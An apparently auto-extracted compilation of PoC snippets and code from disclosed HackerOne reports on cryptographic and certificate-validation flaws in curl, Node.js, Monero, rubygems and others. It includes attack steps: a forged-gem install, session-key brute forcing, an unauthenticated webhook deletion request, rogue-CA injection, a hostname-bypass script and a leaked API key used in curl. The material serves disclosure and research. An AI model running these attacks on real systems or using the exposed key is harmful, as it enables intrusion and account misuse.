# Cryptographic weakness — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #531032 Slack DTLS uses a private key that is in the public domain, which may lead to SRTP stream hijack — slack — $2,000 — Use of Hard-coded Cryptographic Key
Source: `hackerone/reports/2020/531032.md` (https://hackerone.com/reports/531032)

```
openssl x509 -noout -fingerprint -sha256 -inform pem -in janus-cert1.crt 
SHA256 Fingerprint=C5:5F:DA:7D:84:47:B1:BF:6B:55:16:62:48:31:3E:D3:F1:7B:25:89:92:4A:4B:4D:4D:D9:D5:AF:EA:D8:15:44
```

## #2038484 DiffieHellman doesn't generate keys after setting a key — ibb — $1,800 — Cryptographic Issues - Generic
Source: `hackerone/reports/2023/2038484.md` (https://hackerone.com/reports/2038484)

```
//set private key to 2
dh.setPrivateKey(Buffer.from("02", 'hex'));        
//outputs 02 (as expected)
console.log(dh.getPrivateKey().toString('hex'));  
```

```
//generate random private key
dh.generateKeys();                                 
//outputs 02: zero day.
console.log(dh.getPrivateKey().toString('hex'));   
```

```
if (dh->priv_key == NULL)
  {
  priv_key=BN_new();
  if (priv_key == NULL) goto err;
  generate_new_key=1;
  }
else
  priv_key=dh->priv_key;

if (dh->pub_key == NULL)
  {
  pub_key=BN_new();
  if (pub_key == NULL) goto err;
  }
else
  pub_key=dh->pub_key;
```

## #275269 Gem signature forgery — rubygems — $1,000 — Cryptographic Issues - Generic
Source: `hackerone/reports/2018/275269.md` (https://hackerone.com/reports/275269)

```
$ gem --version
2.5.2
$ wget https://raw.githubusercontent.com/intridea/multi_json/master/certs/rwz.pem
$ gem cert --add rwz.pem
Added '/CN=pavel/DC=pravosud/DC=com'
$ gem install --install-dir install -P HighSecurity multi_json-1.12.2.gem
Successfully installed multi_json-1.12.2
1 gem installed
$ ls install/gems/multi_json-1.12.2/
HACKED
```

```
$ tar tvf multi_json-1.12.2.gem
-r--r--r-- wheel/wheel     163 2017-10-05 16:05 data.tar.gz
-r--r--r-- wheel/wheel    1840 2017-09-04 21:51 metadata.gz
-r--r--r-- wheel/wheel     256 2017-09-04 21:51 metadata.gz.sig
-r--r--r-- wheel/wheel   16908 2017-09-04 21:51 data.tar.gz
-r--r--r-- wheel/wheel     256 2017-09-04 21:51 data.tar.gz.sig
-r--r--r-- wheel/wheel     270 2017-09-04 21:51 checksums.yaml.gz
-r--r--r-- wheel/wheel     256 2017-09-04 21:51 checksums.yaml.gz.sig
```

```
  def extract_files destination_dir, pattern = "*"
    verify unless @spec

    FileUtils.mkdir_p destination_dir

    @gem.with_read_io do |io|
      reader = Gem::Package::TarReader.new io

      reader.each do |entry|
        next unless entry.full_name == 'data.tar.gz'

        extract_tar_gz entry, destination_dir, pattern

        return # ignore further entries
      end
    end
  end
```

## #216746 Phabricator is vulnerable to padding oracle attacks and chosen-ciphertext attacks. — phabricator — $750 — Missing Required Cryptographic Step
Source: `hackerone/reports/2017/216746.md` (https://hackerone.com/reports/216746)

```
    $data,
    PhutilOpaqueEnvelope $key,
    PhutilOpaqueEnvelope $iv) {
    $method = 'aes-256-cbc';
    $key = $key->openEnvelope();
    $iv = $iv->openEnvelope();
    $result = openssl_encrypt($data, $method, $key, OPENSSL_RAW_DATA, $iv);
    if ($result === false) {
      throw new Exception(
        pht(
          'Failed to openssl_encrypt() data: %s',
          openssl_error_string()));
    }
    return $result;
```

## #505007 [Twitter Open Source] Releases were & are built/executed/tested/released in the context of insecure/untrusted code — x — $280 — Cryptographic Issues - Generic
Source: `hackerone/reports/2019/505007.md` (https://hackerone.com/reports/505007)

```
       https://github.com/mveytsman/dilettante/blob/master/dilettante.py#L143
```

## #1387366 elections.k8s.io uses weak session secret key, may place elections at risk — kubernetes — $250 — Cryptographic Issues - Generic
Source: `hackerone/reports/2025/1387366.md` (https://hackerone.com/reports/1387366)

```
# Encryption Key
#
# This is used by the Flask server and should be set to a random character
# string, please do not deploy before doing this!.
SECRET_KEY = env('APP_KEY', 'test')
```

```
% curl https://elections.k8s.io -Is | grep cookie
set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.YX-V3g.NET76NNJbweb_qagyfYl2_7TDJg; Expires=Thu, 02 Dec 2021 07:23:10 GMT; HttpOnly; Path=/

% flask-unsign -u -c "eyJfcGVybWFuZW50Ijp0cnVlfQ.YX-V3g.NET76NNJbweb_qagyfYl2_7TDJg"
[*] Session decodes to: {'_permanent': True}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 8192 attemptspdcQHNyXaB0O
'N/A'
```

## #1278254 Built-in TLS module unexpectedly treats "rejectUnauthorized: undefined" as "rejectUnauthorized: false", disabling all certificate validation — nodejs — $150 — Improper Certificate Validation
Source: `hackerone/reports/2021/1278254.md` (https://hackerone.com/reports/1278254)

```
const https = require('https');
const request = https.get('https://expired.badssl.com', { rejectUnauthorized: undefined });
request.on('error', (e) => console.log('Request failed:', e.message));
request.on('response', (e) => console.log('Request succeeded'));
```

## #1039504 Some build dependencies are downloaded over an insecure channel (without subsequent integrity checks) — ibb — $100 — Cryptographic Issues - Generic
Source: `hackerone/reports/2020/1039504.md` (https://hackerone.com/reports/1039504)

```
download_tap_windows () {
    if [ ! -f "download-cache/tap-windows-${TAP_WINDOWS_VERSION}.zip" ]; then
       wget -P download-cache/ \
           "http://build.openvpn.net/downloads/releases/tap-windows-${TAP_WINDOWS_VERSION}.zip"
    fi
}

download_lzo () {
    if [ ! -f "download-cache/lzo-${LZO_VERSION}.tar.gz" ]; then
        wget -P download-cache/ \
            "http://www.oberhumer.com/opensource/lzo/download/lzo-${LZO_VERSION}.tar.gz"
    fi
}
```

```
    if [ ! -f "download-cache/tap-windows-${TAP_WINDOWS_VERSION}.zip" ]; then
       wget -P download-cache/ \
           "http://build.openvpn.net/downloads/releases/tap-windows-${TAP_WINDOWS_VERSION}.zip"
    fi
```

```
    if [ ! -f "download-cache/lzo-${LZO_VERSION}.tar.gz" ]; then
        wget -P download-cache/ \
            "http://www.oberhumer.com/opensource/lzo/download/lzo-${LZO_VERSION}.tar.gz"
    fi
```

## #277534 Timing Attack in Google Authenticator - Per User Prompt — iandunn-projects — $25 — Cryptographic Issues - Generic
Source: `hackerone/reports/2017/277534.md` (https://hackerone.com/reports/277534)

```
if ( sha1( $attempted_password_plaintext ) === $valid_password_hash || wp_check_password( $attempted_password_plaintext, $valid_password_hash ) ) {
	$this->is_using_application_password = true;
	return $user;
}
```

```
if ( 'enabled' == trim( get_user_option( 'googleauthenticator_enabled', $user->ID ) ) && ! $this->is_using_application_password ) {
    // ... OTP stuff
}
```

```
if ( hash_equals( sha1( $attempted_password_plaintext ), $valid_password_hash ) || ... {
```

## #3253725 SameSite restrictions are lifted, and SameSite:Strict cookie are being sent. — brave — - — Improper Certificate Validation
Source: `hackerone/reports/2025/3253725.md` (https://hackerone.com/reports/3253725)

```
<a href='https://SameSite.check.com' target='_blank'>1234</a>" frameborder="0">
```

## #3153497 CVE-2025-5025: No QUIC certificate pinning with wolfSSL — curl — - — Improper Certificate Validation
Source: `hackerone/reports/2025/3153497.md` (https://hackerone.com/reports/3153497)

```
# curl -V
WARNING: this libcurl is Debug-enabled, do not use in production

curl 8.13.0 (x86_64-pc-linux-gnu) libcurl/8.13.0 wolfSSL/5.8.0 zlib/1.3.1 libidn2/2.3.8 libpsl/0.21.2 ngtcp2/1.13.0-DEV nghttp3/1.1
Release-Date: 2025-04-02
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt pop3 pop3s rtsp smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS Debug HSTS HTTP3 HTTPS-proxy IDN IPv6 Largefile libz PSL SSL threadsafe TrackMemory UnixSockets
```

## #1048457 CVE-2020-8286: Inferior OCSP verification — curl — - — Improper Certificate Validation
Source: `hackerone/reports/2020/1048457.md` (https://hackerone.com/reports/1048457)

```
     $ ./curl_ocsp_vuln_test https://revoked.grc.com 
     Curl Error: SSL server certificate status verification FAILED 
```

```
     $ ./curl_ocsp_vuln_test https://revoked.grc.com --replace_ocsp grc_ocsp_resp.der 
     <!DOCTYPE html PUBLIC... 
```

## #3355218 CVE-2025-10966: missing SFTP host verification with wolfSSH — curl — - — Improper Certificate Validation
Source: `hackerone/reports/2025/3355218.md` (https://hackerone.com/reports/3355218)

```
$ ./src/curl --version
curl 8.17.0-DEV (aarch64-apple-darwin23.3.0) libcurl/8.17.0-DEV wolfSSL/5.8.2 zlib/1.2.12 brotli/1.1.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.5 wolfssh/1.4.20 nghttp2/1.66.0 librtmp/2.3
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtmp rtsp sftp smb smbs smtp smtps telnet tftp ws wss
```

```
   # Prereqs (Homebrew)
   brew install wolfssl libpsl libidn2 libnghttp2

   # Build and install wolfSSH with SFTP enabled
   git clone --depth=1 https://github.com/wolfSSL/wolfssh.git
   cd wolfssh
   ./autogen.sh
   ./configure \
     --prefix=$HOME/.local/wolfssh \
     --with-wolfssl=/opt/homebrew \
     --enable-sftp \
     --enable-sshclient \
     --enable-examples \
     CPPFLAGS='-I/opt/homebrew/include' \
     LDFLAGS='-L/opt/homebrew/lib'
   make -j$(sysctl -n hw.ncpu)
   make install
   
```

```
   cd /Users/$USER/scanner-repos/curl
   autoreconf -fi
   PKG_CONFIG_PATH="$HOME/.local/wolfssh/lib/pkgconfig:/opt/homebrew/lib/pkgconfig" \
   CPPFLAGS="-I$HOME/.local/wolfssh/include -I/opt/homebrew/include" \
   LDFLAGS="-L$HOME/.local/wolfssh/lib -L/opt/homebrew/lib" \
   ./configure \
     --without-libssh2 \
     --without-libssh \
     --with-wolfssh=$HOME/.local/wolfssh \
     --with-wolfssl=/opt/homebrew \
     --disable-shared
   make -j$(sysctl -n hw.ncpu)
   
```

## #3698862  `check_reserve_proof` sums RingCT ECDH amounts without checking the output commitment — monero — - — Missing Required Cryptographic Step
Source: `hackerone/reports/2026/3698862.md` (https://hackerone.com/reports/3698862)

```
uint64_t amount = tx.vout[proof.index_in_tx].amount;
if (amount == 0)
{
  crypto::secret_key shared_secret;
  crypto::derivation_to_scalar(derivation, proof.index_in_tx, shared_secret);
  rct::ecdhTuple ecdh_info = tx.rct_signatures.ecdhInfo[proof.index_in_tx];
  rct::ecdhDecode(ecdh_info, rct::sk2rct(shared_secret),
      tx.rct_signatures.type == rct::RCTTypeBulletproof2 ||
      tx.rct_signatures.type == rct::RCTTypeCLSAG ||
      tx.rct_signatures.type == rct::RCTTypeBulletproofPlus);
  amount = rct::h2d(ecdh_info.amount);   // no C == mask*G + amount*H check
}
total += amount;
```

```
const rct::key C = tx.rct_signatures.outPk[n].mask;
rct::key Ctmp;
rct::addKeys2(Ctmp, ecdh_info.mask, ecdh_info.amount, rct::H);
if (rct::equalKeys(C, Ctmp))
  amount = rct::h2d(ecdh_info.amount);
else
  amount = 0;
```

```
TEST(ringct, reserveProofStyleDecodeNeedsCommitmentCheck)
{
  static constexpr uint64_t real_amount = 1;
  static constexpr uint64_t fake_amount = 1000000000000;

  const rct::key amount_key = rct::skGen();
  const rct::key commitment_mask = rct::genCommitmentMask(amount_key);
  rct::key output_commitment;
  rct::addKeys2(output_commitment, commitment_mask, rct::d2h(real_amount), rct::H);

  rct::ecdhTuple encoded = {};
  encoded.amount = rct::d2h(fake_amount);
  rct::ecdhEncode(encoded, amount_key, true);

  rct::ecdhTuple reserve_proof_style_decode = encoded;
  rct::ecdhDecode(reserve_proof_style_decode, amount_key, true);
  ASSERT_EQ(fake_amount, rct::h2d(reserve_proof_style_decode.amount));

  rct::key recomputed_commitment;
  rct::addKeys2(recomputed_commitment, reserve_proof_style_decode.mask,
      reserve_proof_style_decode.amount, rct::H);
  ASSERT_NE(output_commitment, recomputed_commitment);

  rct::rctSig rv;
  rv.type = rct::RCTTypeCLSAG;
  rv.ecdhInfo.push_back(encoded);
  rv.outPk.push_back({});
  rv.outPk[0].mask = output_commitment;

  rct::key decoded_mask;
  EXPECT_THROW(
    (void)rct::decodeRctSimple(rv, amount_key, 0, decoded_mask, hw::get_device("default")),
    std::runtime_error
  );
}
```

## #2446531 Weak ssh algorithms and CVE-2023-48795 Discovered on various subdomains of nextcloud.com — nextcloud — - — Use of a Broken or Risky Cryptographic Algorithm
Source: `hackerone/reports/2024/2446531.md` (https://hackerone.com/reports/2446531)

```
nmap --script ssh2-enum-algos target -sV -p- 

# SSH-AUDIT 
ssh-audit Target 

https://www.sshaudit.com/
```

```
    **Description:** SHA-1 is known to have several practical & exploitable weaknesses.
```

```
    - ssh-rsa
    - diffie-hellman-group14-sha1
    - hmac-sha1-etm@openssh.com
    - hmac-sha1
```

## #2669852 CVE-2024-8096: OCSP stapling bypass with GnuTLS — curl — - — Improper Certificate Validation
Source: `hackerone/reports/2024/2669852.md` (https://hackerone.com/reports/2669852)

```
  if(config->verifystatus) {
    if(gnutls_ocsp_status_request_is_checked(session, 0) == 0) {
      gnutls_datum_t status_request;
      gnutls_ocsp_resp_t ocsp_resp;

      gnutls_ocsp_cert_status_t status;
      gnutls_x509_crl_reason_t reason;

      rc = gnutls_ocsp_status_request_get(session, &status_request);

      infof(data, " server certificate status verification FAILED");

      if(rc == GNUTLS_E_REQUESTED_DATA_NOT_AVAILABLE) {
        failf(data, "No OCSP response received");
        return CURLE_SSL_INVALIDCERTSTATUS;
      }

      if(rc < 0) {
        failf(data, "Invalid OCSP response received");
        return CURLE_SSL_INVALIDCERTSTATUS;
      }

      gnutls_ocsp_resp_init(&ocsp_resp);

      rc = gnutls_ocsp_resp_import(ocsp_resp, &status_request);
      if(rc < 0) {
        failf(data, "Invalid OCSP response received");
        return CURLE_SSL_INVALIDCERTSTATUS;
      }

      (void)gnutls_ocsp_resp_get_single(ocsp_resp, 0, NULL, NULL, NULL, NULL,
                                        &status, NULL, NULL, NULL, &reason);

      switch(status) {
      case GNUTLS_OCSP_CERT_GOOD:
        break;

      case GNUTLS_OCSP_CERT_REVOKED: {
        const char *crl_reason;

        switch(reason) {
          default:
          case GNUTLS_X509_CRLREASON_UNSPECIFIED:
            crl_reason = "unspecified reason";
            break;

          case GNUTLS_X509_CRLREASON_KEYCOMPROMISE:
            crl_reason = "private key compromised";
            break;

       
```

```
    if(gnutls_ocsp_status_request_is_checked(session, 0) == 0) {
      gnutls_datum_t status_request;
      gnutls_ocsp_resp_t ocsp_resp;
```

```
      gnutls_ocsp_cert_status_t status;
      gnutls_x509_crl_reason_t reason;
```

## #3694390 CVE-2026-7009: OCSP stapling bypass with Apple SecTrust — curl — - — Improper Certificate Validation
Source: `hackerone/reports/2026/3694390.md` (https://hackerone.com/reports/3694390)

```
#ifdef USE_APPLE_SECTRUST
  if(!verified && conn_config->verifypeer && ssl_config->native_ca_store) {
    result = ossl_apple_verify(cf, data, octx, peer, &verified);
    if(verified) {
      sectrust_verified = TRUE;
    }
  }
#endif
  ...
  if(conn_config->verifystatus &&
#ifdef USE_APPLE_SECTRUST
     !sectrust_verified &&  /* <-- skips the OCSP check */
#endif
     !octx->reused_session) {
    result = verifystatus(cf, data, octx);  /* never reached */
  }
```

```
cmake -DCURL_USE_OPENSSL=ON -DUSE_APPLE_SECTRUST=OFF
```

```
curl --version
curl 8.20.0-DEV (Darwin) libcurl/8.20.0-DEV OpenSSL/3.6.1 zlib/1.2.12 brotli/1.2.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.5 nghttp2/1.68.0
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt mqtts pop3 pop3s rtsp smb smbs smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS brotli HSTS HTTP2 HTTPS-proxy IDN IPv6 Largefile libz NTLM PSL SSL threadsafe TLS-SRP UnixSockets zstd
```

## #3374554 Apple SecTrust legacy path accepts untrusted certificates on pre-10.14 macOS/iOS when built with USE_APPLE_SECTRUST — curl — - — Improper Certificate Validation
Source: `hackerone/reports/2025/3374554.md` (https://hackerone.com/reports/3374554)

```
   cmake -DUSE_APPLE_SECTRUST=ON -DCURL_USE_OPENSSL=ON \
         -DCMAKE_BUILD_TYPE=Release ..
   
```

```
#ifndef REQUIRES_SecTrustEvaluateWithError
SecTrustResultType sec_result;
status = SecTrustEvaluate(trust, &sec_result);

if(status != noErr) {
  failf(data, "Apple SecTrust verification failed: error %i", (int)status);
}
else if((status == kSecTrustResultUnspecified) ||
        (status == kSecTrustResultProceed)) {
  /* "unspecified" means system-trusted with no explicit user setting */
  result = CURLE_OK;
}
#endif /* REQUIRES_SecTrustEvaluateWithError */
```

```
result = SecTrustEvaluateWithError(trust, &error) ?
         CURLE_OK : CURLE_PEER_FAILED_VERIFICATION;
```

## #3700036 SpendProofV1 txid-substitution: get_spend_proof/check_spend_proof do not verify returned transaction hash — monero — - — Missing Required Cryptographic Step
Source: `hackerone/reports/2026/3700036.md` (https://hackerone.com/reports/3700036)

```
std::string sig_prefix_data((const char*)&txid, sizeof(crypto::hash));
sig_prefix_data += message;
crypto::hash sig_prefix_hash;
crypto::cn_fast_hash(sig_prefix_data.data(), sig_prefix_data.size(), sig_prefix_hash);
// ring sigs use tx / rings from res.txs[0], not a second hash check
```

```
THROW_WALLET_EXCEPTION_IF(tx_hash != txid, error::wallet_internal_error,
    "Failed to get the right transaction from daemon");
```

```
bash /home/beni/Monero/reports/poc_spend_proof_txid_substitution.sh
```

## #3752567 curl GnuTLS backend accepts a clientAuth-only certificate for HTTPS server authentication — curl — - — Improper Certificate Validation
Source: `hackerone/reports/2026/3752567.md` (https://hackerone.com/reports/3752567)

```
gnutls_certificate_set_verify_flags(creds,
                                    GNUTLS_VERIFY_ALLOW_X509_V1_CA_CRT);
```

```
int rc = gnutls_certificate_verify_peers2(session, &verify_status);
...
verified = !(verify_status & GNUTLS_CERT_INVALID);
if(verified)
  infof(data, "  SSL certificate verified by GnuTLS");
```

```
rc = (int)gnutls_x509_crt_check_hostname(x509_cert,
                                         peer->sni ? peer->sni :
                                         peer->dest->hostname);
result = (!rc && config->verifyhost) ?
  CURLE_PEER_FAILED_VERIFICATION : CURLE_OK;
```

## #3463949 Missing AES-GCM Authentication Tag Validation and Improper Deprecation Handling — nodejs — - — Missing Required Cryptographic Step
Source: `hackerone/reports/2025/3463949.md` (https://hackerone.com/reports/3463949)

```
const {
    createCipheriv,
    createDecipheriv
} = require('crypto');

const key = 'key0123456789key';
const nonce = '123456789012';

var algo = 'aes-128-gcm';
const cipher = createCipheriv(algo, key, nonce);
const plaintext = 'This is some plaintext';

const ciphertext = cipher.update(plaintext, 'utf8');
cipher.final();
const tag = cipher.getAuthTag();


var decipher = createDecipheriv(algo, key, nonce);
decipher.setAuthTag(tag);
var decryptedPlaintext = decipher.update(ciphertext, null, 'utf8') + decipher.final();

console.log('Decrypted with full tag: ' + decryptedPlaintext);

console.log('---------------------------------');

decipher = createDecipheriv(algo, key, nonce);
// Truncating the authentication tag
decipher.setAuthTag(tag.subarray(0, 4));
decryptedPlaintext = decipher.update(ciphertext, null, 'utf8') + decipher.final();
console.log('Decrypted with truncated tag: ' + decryptedPlaintext);
```

```
    - For example, if the decrypted data is expected to be JSON, it's possible to observe valid/invalid JSON parsing to decrypt the ciphertext just like with padding oracles
```

```
    - Requires rotation of the encryption keys
```

## #3784125 GnuTLS OCSP stapling accepts unrelated SingleResponse (no cert-ID binding) — curl — - — Improper Certificate Validation
Source: `hackerone/reports/2026/3784125.md` (https://hackerone.com/reports/3784125)

```
gnutls_ocsp_status_request_get(session, &status_request)   // gtls.c:1437
  → gnutls_ocsp_resp_import(ocsp_resp, &status_request)    // gtls.c:1457
  → gnutls_ocsp_resp_get_single(ocsp_resp, 0, ..., &status, ..., &reason)  // gtls.c:1464–1465
  → trust sink: (status != GNUTLS_OCSP_CERT_GOOD) ? CURLE_SSL_INVALIDCERTSTATUS : CURLE_OK  // gtls.c:1527–1528
```

```
OCSPResponse {
  responseStatus: successful
  responseBytes: BasicOCSPResponse {
    responses: [
      SingleResponse {                   ← index 0 (trusted by gtls.c)
        certID: { <UNRELATED cert/issuer hash> }
        certStatus: good
      },
      SingleResponse {                   ← index 1 (ignored by gtls.c)
        certID: { <actual peer cert hash> }
        certStatus: revoked
      }
    ]
  }
}
```

```
    responses: [
      SingleResponse {                   ← index 0 (trusted by gtls.c)
        certID: { <UNRELATED cert/issuer hash> }
        certStatus: good
      },
      SingleResponse {                   ← index 1 (ignored by gtls.c)
        certID: { <actual peer cert hash> }
        certStatus: revoked
      }
    ]
```

## #1302395 Sauce Labs API key unencrypted in an old commit — rails — - — Use of Hard-coded Cryptographic Key
Source: `hackerone/reports/2024/1302395.md` (https://hackerone.com/reports/1302395)

```
curl https://rubyonrails:a035343f-e922-40b3-aa3c-06b3ea635c48@saucelabs.com/rest/v1/users/rubyonrails
```

```
{"username": "rubyonrails", "vm_lockdown": false, "new_email": null, "last_name": null, "tunnels_lockdown": false, "parent": null, "team_management": true, "creation_time": 1462825877, "user_type": "floss (medium)", "monthly_minutes": {"manual": "infinite", "automated": "infinite"}, "prevent_emails": ["marketing"], "to_plan": null, "performance_enabled": false, "domain": null, "manual_minutes": "infinite", "can_run_manual": true, "concurrency_limit": {"mac": 15, "scout": 10, "overall": 10, "real_device": 0}, "is_public": true, "to_username": null, "id": "rubyonrails", "access_key": "a035343f-e922-40b3-aa3c-06b3ea635c48", "first_name": "Ruby on Rails", "verified": true, "name": null, "subscribed": false, "title": null, "ancestor_user_type": "floss (medium)", "terminating_subscription": false, "is_sso": false, "allow_integrations_page": true, "to_migration_status": null, "last_login": null, "ancestor_concurrency_limit": {"mac": 15, "scout": 10, "overall": 10, "real_device": 0}, "allowed_regions": ["us-west-1"], "require_full_name": false, "sso_alias": null, "ancestor": "rubyonrails", "minutes": "infinite", "email": "██████████", "to_migration_date": null}%
```

## #3574928 Able to bypass HSTS using trailing dot — curl — - — Missing Required Cryptographic Step
Source: `hackerone/reports/2026/3574928.md` (https://hackerone.com/reports/3574928)

```
curl 8.16.0 (Windows) libcurl/8.16.0 Schannel zlib/1.3.1 WinIDN
Release-Date: 2025-09-10
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s smb smbs smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS HSTS HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM SPNEGO SSL SSPI threadsafe Unicode UnixSockets
```

```
curl --hsts hsts.txt http://accounts.google.com.
```

## #3697491 Missing HMAC validation on /uninstall webhook in Shopify/sample-django-app reference template — shopify — - — Improper Verification of Cryptographic Signature
Source: `hackerone/reports/2026/3697491.md` (https://hackerone.com/reports/3697491)

```
@csrf_exempt
def uninstall(request):
    uninstall_data = json.loads(request.body)
    shop = uninstall_data.get("domain")
    Shop.objects.filter(shopify_domain=shop).delete()
    return HttpResponse(status=204)
```

```
curl -X POST https://target-app.com/uninstall \
  -H "Content-Type: application/json" \
  -d '{"domain": "target-shop-domain"}'
```

```
HTTP/1.1 204 No Content
```

## #3633146 Sandbox User Can Inject Rogue CA Certificate into OS Trust Store via Sudo-Allowed deploy-certificates.sh — aws_vdp — - — Improper Certificate Validation
Source: `hackerone/reports/2026/3633146.md` (https://hackerone.com/reports/3633146)

```
python3 demo-rogue-ca.py
```

```
STEP 1: We are NOT root
  User: genesis1ptools
  UID: 992
  Can we write to /etc/pki? NO:
  touch: cannot touch '/etc/pki/ca-trust/source/anchors/test': Permission denied

STEP 3: We can run deploy-certificates.sh as ROOT (no password)
  (root) NOPASSWD: /opt/amazon/genesis1p-tools/bin/deploy-certificates.sh
  This means: we can install ANY certificate into the OS trust store

STEP 4: Generate rogue CA certificate
  Subject: CN=ATTACKER-ROGUE-CA,O=Malicious,C=XX
  CA: TRUE

STEP 5: sudo deploy-certificates.sh -- injects as root
  [INFO] Running as user: root
  [INFO] Deploying to /etc/pki/ca-trust/source/anchors/rogue-ca.pem
  [INFO] update-ca-trust completed successfully
  [INFO] SUCCESS: Certificate deployment finished

STEP 6: Rogue CA is now in the OS trust store
  -rw-r--r-- 1 root root 1139 rogue-ca.pem

STEP 7: Forge cert for ████████
  Subject: CN=████████
  Issuer:  CN=ATTACKER-ROGUE-CA,O=Malicious,C=XX
  Forged cert ACCEPTED by SSL context with rogue CA
  Signature verification: VALID -- forged cert is signed by rogue CA
```

## #3739561 SSL session-cache peer key omits signature_algorithms: strict-sigalg handle silently resumes a permissive sibling's session — curl — - — Improper Certificate Validation
Source: `hackerone/reports/2026/3739561.md` (https://hackerone.com/reports/3739561)

```
  if(ssl->cipher_list13) {
    r = curlx_dyn_addf(&buf, ":CIPHER13-%s", ssl->cipher_list13);
    if(r) goto out;
  }
  if(ssl->curves) {
    r = curlx_dyn_addf(&buf, ":CURVES-%s", ssl->curves);
    if(r) goto out;
  }
  /* <-- signature_algorithms NOT added to peer key */
  if(ssl->verifypeer) {
    …
  }
```

```
static bool match_ssl_primary_config(struct Curl_easy *data,
                                     struct ssl_primary_config *c1,
                                     struct ssl_primary_config *c2)
{
  (void)data;
  if((c1->version == c2->version) &&
     (c1->version_max == c2->version_max) &&
     (c1->ssl_options == c2->ssl_options) &&
     (c1->verifypeer == c2->verifypeer) &&
     (c1->verifyhost == c2->verifyhost) &&
     (c1->verifystatus == c2->verifystatus) &&
     blobcmp(c1->cert_blob, c2->cert_blob) &&
     blobcmp(c1->ca_info_blob, c2->ca_info_blob) &&
     blobcmp(c1->issuercert_blob, c2->issuercert_blob) &&
     Curl_safecmp(c1->CApath, c2->CApath) &&
     Curl_safecmp(c1->CAfile, c2->CAfile) &&
     Curl_safecmp(c1->issuercert, c2->issuercert) &&
     Curl_safecmp(c1->clientcert, c2->clientcert) &&
#ifdef USE_TLS_SRP
     !Curl_timestrcmp(c1->username, c2->username) &&
     !Curl_timestrcmp(c1->password, c2->password) &&
#endif
     curl_strequal(c1->cipher_list, c2->cipher_list) &&
     curl_strequal(c1->cipher_list13, c2->cipher_list13) &&
     curl_strequal(c1->curves, c2->curves) &&
     curl_strequal(c1->signature_algorithms,        /* line 219 */
                   c2->signature_algorithms) &&
     curl_strequal(c1->CRLfile, c2->CRLfile) &&
     curl_strequal(c1->pinned_key, c2->pinned_key))
    return TRUE;

  return FALSE;
}
```

```
./configure --with-openssl=<path> --enable-debug --enable-curldebug
make
```

## #3896617 Connector/C TLS auth-switch bypass exposes plaintext password on hostname verification failure — mariadb — - — Improper Certificate Validation
Source: `hackerone/reports/2026/3896617.md` (https://hackerone.com/reports/3896617)

```
if ((mysql->net.tls_verify_status & MARIADB_TLS_VERIFY_TRUST) &&
    !password_and_hashing(mysql, auth_plugin))
```

```
diff --git a/plugins/auth/my_auth.c b/plugins/auth/my_auth.c
index 8ee14b66..17007b8b 100644
--- a/plugins/auth/my_auth.c
+++ b/plugins/auth/my_auth.c
@@ -872,12 +872,12 @@ retry:
       auth_plugin= &dummy_fallback_client_plugin;
 
     /* can we use this plugin with this tls server cert ? */
-    if ((mysql->net.tls_verify_status & MARIADB_TLS_VERIFY_TRUST) &&
+    if (mysql->net.tls_verify_status &&
         !password_and_hashing(mysql, auth_plugin))
     {
       my_set_error(mysql, CR_SSL_CONNECTION_ERROR, SQLSTATE_UNKNOWN,
                    ER(CR_SSL_CONNECTION_ERROR),
-                   "Certificate verification failure: The certificate is NOT trusted.");
+                   "Certificate verification failure: peer certificate verification failed.");
       return 1;
     }
     goto retry;
```

```
    !password_and_hashing(mysql, auth_plugin))
```

## #3455037 Certificate Hostname Validation Bypass via Leading Dot in Hostname — curl — - — Improper Certificate Validation
Source: `hackerone/reports/2025/3455037.md` (https://hackerone.com/reports/3455037)

```
#!/bin/bash
CURL="${1:-curl}"
PORT=9443

cat > /tmp/san.cnf << 'EOF'
[req]
distinguished_name = req_distinguished_name
x509_extensions = v3_req
prompt = no
[req_distinguished_name]
CN = *.test.local
[v3_req]
subjectAltName = DNS:*.test.local
EOF

openssl req -x509 -newkey rsa:2048 -keyout /tmp/wc.key -out /tmp/wc.crt -days 1 -nodes -config /tmp/san.cnf 2>/dev/null

fuser -k $PORT/tcp 2>/dev/null
sleep 1

openssl s_server -accept $PORT -cert /tmp/wc.crt -key /tmp/wc.key -www </dev/null >/dev/null 2>&1 &
PID=$!
sleep 2

$CURL -v --max-time 5 --cacert /tmp/wc.crt --resolve ".test.local:$PORT:127.0.0.1" "https://.test.local:$PORT/" 2>&1

kill $PID 2>/dev/null
rm -f /tmp/san.cnf /tmp/wc.key /tmp/wc.crt
```

## #713321 Exploiting Network and Timing Side-Channels to Break Monero Receiver Anonymity — monero — - — None
Source: `hackerone/reports/2019/713321.md` (https://hackerone.com/reports/713321)

```
    - PoC within a report will most likely result in more bounty than not
```

## #746733 Remotely trigger an assertion on a TLS server with a malformed certificate string — nodejs — - — Improper Certificate Validation
Source: `hackerone/reports/2020/746733.md` (https://hackerone.com/reports/746733)

```
const tls = require("tls");
const fs = require("fs");

let server = tls.createServer({
    ca: fs.readFileSync("./ca.crt"),
    cert: fs.readFileSync("./server.crt"),
    key: fs.readFileSync("./server.key"),
    requestCert: true,
    rejectUnauthorized: true
}, (socket) => {
    socket.setEncoding("utf8");
    socket.on("data", (data) => {
        console.log("server.socket.data", data);
        socket.write(data);
    });
    socket.on("end", () => undefined);
    socket.on("error", () => undefined);

    // THIS CRASHES THE SERVER
    console.log(socket.getPeerCertificate());
});
server.listen({ port: 12345 }, () => {
    console.log("listening!")
});
```

```
const tls = require("tls");
const fs = require("fs");
const client = tls.connect({
    host: "pc57.network.local",
